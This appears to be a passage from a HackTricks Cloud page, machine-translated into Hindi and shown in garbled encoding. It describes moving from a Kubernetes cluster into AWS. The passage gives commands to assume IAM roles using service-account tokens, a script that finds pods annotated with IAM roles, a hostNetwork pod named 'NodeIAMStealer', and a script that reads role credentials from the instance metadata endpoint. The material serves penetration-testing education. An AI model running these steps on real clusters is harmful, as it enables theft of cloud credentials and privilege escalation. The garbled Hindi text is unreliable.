рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдиреЗ рдкрд░ `/var/run/secrets/eks.amazonaws.com/serviceaccount/token` рд╕реЗ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ aws рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЪрд▓рд╛рдПрдВ:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ, рдпрджрд┐ рдЖрдк рдПрдХ K8s рдХреНрд▓рд╕реНрдЯрд░ рдХреА рдЧрдгрдирд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ **рдЙрд╕ рдПрдиреЛрдЯреЗрд╢рди рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк AWS рдореЗрдВ рдЙрдиреНрдирдд рдХрд░ рд╕рдХреЗрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП, рдмрд╕ рдПрдХ IAM **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рдкреЙрдб** рдХреЛ **рдПрдХреНрдЬреАрдХреНрдпреВрдЯ/рдмрдирд╛рдПрдВ** рдФрд░ рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓реЗрдВред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдк рдПрдХ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ **AWS\_ROLE\_ARN** рдФрд░ **AWS\_WEB\_IDENTITY\_TOKEN** рдЬреИрд╕реЗ env variables рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
{% endhint %}

{% hint style="danger" %}
рдХрднреА-рдХрднреА рдПрдХ рднреВрдорд┐рдХрд╛ рдХреА рд╡рд┐рд╢реНрд╡рд╛рд╕рдиреАрдпрддрд╛ рдиреАрддрд┐ рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдФрд░ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп рдЙрдореНрдореАрдж рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЛ AssumeRole рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдпрд╣ рд╕рднреА рд╕реЗрд╡рд╛ рдЦрд╛рддреЛрдВ рдХреЛ рджреЗрддреА рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдкрд░ рдПрдХ рдПрдиреЛрдЯреЗрд╢рди рд▓рд┐рдЦрдиреЗ рдХреЗ рдХреНрд╖рдорддрд╛ рд╣реИрдВ, рддреЛ рдЖрдк рднреВрдорд┐рдХрд╛ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ IAM рднреВрдорд┐рдХрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдкреЙрдб рдФрд░ SAs рдвреВрдВрдвреЗрдВ

рдпрд╣ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╣реИ рдЬреЛ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╕рднреА рдкреЙрдб рдФрд░ SAs** рдХреА рдкрд░рд┐рднрд╛рд╖рд╛рдУрдВ рдкрд░ **рдвреВрдВрдврд╝рддрд╛ рд╣реИ** рдЙрд╕ **рдПрдиреЛрдЯреЗрд╢рди** рдХреЗ рд▓рд┐рдП:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### рдиреЛрдб IAM рд░реЛрд▓

рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рдореЗрдВ IAM рд░реЛрд▓ рдХреЛ рдХреИрд╕реЗ рдкреЙрдб рдХреЗ рд╕рд╛рде рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдерд╛, рд▓реЗрдХрд┐рди рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ K8s рдХреНрд▓рд╕реНрдЯрд░ рдХрд╛ рдПрдХ рдиреЛрдб рдПрдХ рдХреНрд▓рд╛рдЙрдб рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рд╣реЛрдЧрд╛ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдиреЛрдб рдХреЗ рдкрд╛рд╕ рдПрдХ рдирдпрд╛ IAM рд░реЛрд▓ рд╣реЛрдиреЗ рдХреА рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ (_рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдорддреМрд░ рдкрд░ K8s рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд╕рднреА рдиреЛрдбреЛрдВ рдХреЗ рдкрд╛рд╕ рдПрдХ рд╣реА IAM рд░реЛрд▓ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рд░ рдиреЛрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рд╡рд╛рдкрд╕ рдирд╣реАрдВ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ_ред)

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдиреЛрдб рд╕реЗ рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рдЖрдкрдХреЛ рдиреЛрдб рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП (ssh рд╕рддреНрд░?) рдпрд╛ рдХрдо рд╕реЗ рдХрдо рдПрдХ рд╣реА рдиреЗрдЯрд╡рд░реНрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM рд░реЛрд▓ рдЯреЛрдХрди рдЪреБрд░рд╛рдПрдВ

рдкрд╣рд▓реЗ рд╣рдордиреЗ рдмрд╛рдд рдХреА рдереА рдХрд┐ рдХреИрд╕реЗ **рдкреЙрдбреНрд╕ рдХреЛ IAM рд░реЛрд▓ рдЬреЛрдбрд╝реЗрдВ** рдпрд╛ рдлрд┐рд░ рдХреИрд╕реЗ **рдиреЛрдб рдкрд░ рднрд╛рдЧрдиреЗ рдХреЗ рд▓рд┐рдП IAM рд░реЛрд▓ рдЪреБрд░рд╛рдПрдВ** рдЬреЛ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдЗрд╕рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝рд╛ рд╣реЛрддрд╛ рд╣реИред

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреЗ рдирдП рдореЗрд╣рдирддреА **IAM рд░реЛрд▓ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## рд╕рдВрджрд░реНрдн

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ рдЯреНрд╡рд┐рдЯрд░ рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
